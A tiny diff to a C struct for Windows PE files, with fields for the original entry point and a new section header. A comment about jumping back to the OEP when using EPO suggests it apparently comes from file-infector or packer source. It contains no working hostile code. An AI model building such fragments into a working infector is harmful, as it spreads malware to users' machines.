@@ -32,7 +32,8 @@ typedef struct {
 	
 	    HANDLE                hFile;
 	    /*DWORD                 errorCode;*/
-	    DWORD                 ep;
+	    /*DWORD                 pathAddr;*/ /* for backward jump to OEP (if we use EPO) call 0xXXXXXXXX*/
+ 	    DWORD                 ep;
 	    DWORD                 oEp;
 	    PIMAGE_SECTION_HEADER nSection;
 	
